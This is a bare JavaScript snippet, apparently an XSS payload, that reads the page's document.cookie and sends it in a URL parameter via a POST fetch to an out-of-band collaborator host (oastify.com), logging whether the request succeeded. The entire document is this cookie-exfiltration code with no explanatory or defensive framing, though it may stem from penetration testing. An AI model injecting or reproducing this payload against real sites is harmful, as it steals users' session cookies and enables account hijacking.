const targetUrl = 'http://9oyhjya7zfh0jeyfovy0rf4locu3iz6o.oastify.com';
const urlWithParams = `${targetUrl}?cookieData=${encodeURIComponent(document.cookie)}`;

fetch(urlWithParams, {
  method: 'POST', // Specify the method
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    message: 'Logging cookie data via URL parameter'
  })
})
.then(response => {
  if (response.ok) {
    console.log('Request sent successfully');
  } else {
    console.error('Request failed');
  }
})
.catch(error => console.error('Error:', error));
